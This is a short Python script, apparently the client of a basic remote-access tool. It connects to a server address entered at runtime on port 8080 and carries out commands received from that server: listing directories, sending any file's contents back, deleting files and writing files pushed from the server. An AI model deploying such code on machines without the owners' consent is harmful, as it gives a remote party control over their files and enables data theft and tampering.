#command list
# view_cwd --> will show all files in directory where the file is running
# custom_dir --> will show files from custom directory
# download_file --> will download files from directory

import os
import socket

s = socket.socket()
port = 8080
host = input(str("Please enter the server address: "))
s.connect((host,port))
print("")
print("Connected to server sucessfully")
print("")

#connection has been completed
#command receiving and execution

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("Command recieved")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")
    
    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully..")
        print("")

    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path,"rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has been sent sucessfully")
        print("")

    elif command == "remove_file": 
        fileandir = s.recv(6000)
        fileanddir = fileandir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed sucessfully")
        print("")

    elif command == "send_file":
        filename= s.recv(6000)
        print(filename)
        new_file = open(filename,"wb")
        data=s.recv(6000)
        print(data)
        new_file.write(data)
        new_file.close()


    else:
        print("")
        print("Command not recognized.")